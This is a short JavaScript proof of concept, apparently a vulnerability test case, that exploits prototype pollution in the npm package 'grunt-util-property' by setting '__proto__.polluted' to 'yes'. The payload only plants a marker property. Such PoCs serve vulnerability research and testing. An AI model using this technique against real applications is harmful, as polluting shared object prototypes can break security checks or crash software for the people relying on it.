function exploitFunction(grunt) {
  const a = require("grunt-util-property");
  let b = a(grunt);
  b.call({}, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };